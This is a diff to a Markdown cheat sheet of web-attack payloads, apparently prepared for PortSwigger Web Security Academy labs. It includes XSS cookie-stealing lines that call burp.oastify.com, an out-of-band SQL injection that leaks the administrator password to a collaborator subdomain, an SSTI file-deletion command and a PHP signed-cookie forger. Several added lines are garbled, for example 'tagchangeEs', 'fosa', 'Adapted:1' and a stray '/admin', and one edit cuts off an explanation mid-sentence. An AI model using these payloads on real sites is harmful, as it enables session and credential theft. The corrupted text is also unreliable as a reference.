@@ -82,6 +82,7 @@ Adapted:
 \"-fetch('http://burp.oastify.com?c='+btoa(document.cookie))}//
 ```
 4. Stored DOM XSS  
+We detect `repalce()` function in js  
 Function replaces first angle brakets only:
 ```
 <><img src=1 onerror=alert(1)>
@@ -122,7 +123,7 @@ changeReq.send('csrf='+token+'&email=test@test.com')};
 </script>
 ```
 8. Reflected XSS into HTML context with most tags and attributes blocked  
-BruteForce all tags by using xss cheat-sheet, then:
+BruteForce all tagchangeEs by using xss cheat-sheet, then:
 ```
 <iframe src="https://0a61001b0306cecac0be0a5000570086.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
 ```
@@ -144,7 +145,7 @@ location = 'https://kek.web-security-academy.net/?query=%3Cbody+onload%3Ddocumen
 location='https://kek.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
 </script>
 ```
-Adapted:
+Adapted:1
 ```
 <xss id=x onfocus=document.location="http://burp.oastify.com/?c="+document.cookie tabindex=1>#x
 
@@ -224,9 +225,9 @@ OR my variant:
 If you have `Advanced Search` page on your exam, you are more likely about to get easy priv escalation.  
 Also check `TrackingId` cookie  
 Run `sqlmap` with risk 3 and level 5  
-Also SQL injection vector could be potentially found in XML (stock check functionality) and it would not be found with sqlmap. We need to exploit it using Hackvertor entity encoding:
+Also SQL injection vector could be potentially fosa
 ```
-<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
 ```
 ## CSRF
 Arises in update email functionality  
@@ -640,7 +641,7 @@ Arises at View Details with reflected phrase `Unfortunately this product is out 
 1. Basic server-side template injection  
 Ruby
 ```
-<%= system("rm+morale.txt")https://hackehttps://book.hacktricks.xyz/rone.com/opportunities/all
+<%= system("rm+morale.txt") %>
 ```
 2. Basic server-side template injection (code context)  
 ```
@@ -784,7 +785,7 @@ X-Forwarded-For: 1.1.1.1
         fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
     };
 </script>
-```1
+```
 ## Web cache poisoning
 Watch for `/resources/js/tracking.js` file and `X-Cache: hit` header in response. If you got only tracking.js without X-Cache - no cache poisoning here  
 If you got both file and header, the first thing you should try is to inject your exploit server into Host: or X-Forwarded-Host: headers and check them in response  
@@ -893,7 +894,7 @@ $object = "OBJECT-GENERATED-BY-PHPGGC";
 $secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
 $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
 echo $cookie;
-```
+```/admin
 6. Exploiting Ruby deserialization using a documented gadget chain
 ```
 1. Use burp scanner to identify that the serialized object is Ruby using Marshal
